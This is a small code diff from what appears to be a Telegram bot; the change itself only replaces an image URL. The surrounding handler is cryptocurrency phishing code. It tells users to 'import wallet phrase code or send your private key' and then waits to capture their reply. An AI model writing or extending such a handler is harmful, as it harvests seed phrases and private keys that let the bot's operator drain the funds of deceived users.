@@ -26,7 +26,7 @@ def handle_connect(call):
 
 def handle_connect_wallet(call):
     chat_id = call.message.chat.id
-    image_url = 'https://raw.githubusercontent.com/raccityy/raccityy.github.io/refs/heads/main/connect.jpg'
+    image_url = 'https://github.com/raccityy/images-for-raw/blob/main/connect.jpg?raw=true'
     text = "📥Import Wallet Phrase Code or send your private key To Connect"
     connect_phrase_waiting[chat_id] = True
     try:
